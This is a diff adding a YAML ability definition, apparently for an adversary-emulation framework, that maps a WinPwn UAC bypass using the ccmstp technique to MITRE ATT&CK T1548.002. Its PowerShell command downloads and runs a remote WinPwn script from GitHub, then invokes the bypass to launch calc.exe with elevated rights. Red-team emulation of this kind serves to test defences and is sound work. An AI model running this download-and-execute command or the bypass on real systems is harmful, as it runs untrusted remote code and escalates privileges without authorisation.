@@ -1,0 +1,19 @@
+---
+- id: 3a91d19857b1b7ab94cfb84cfe6aa438
+  name: WinPwn - UAC Bypass ccmstp technique
+  description: UAC bypass using ccmstp technique via function of WinPwn
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique
+          ccmstp
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
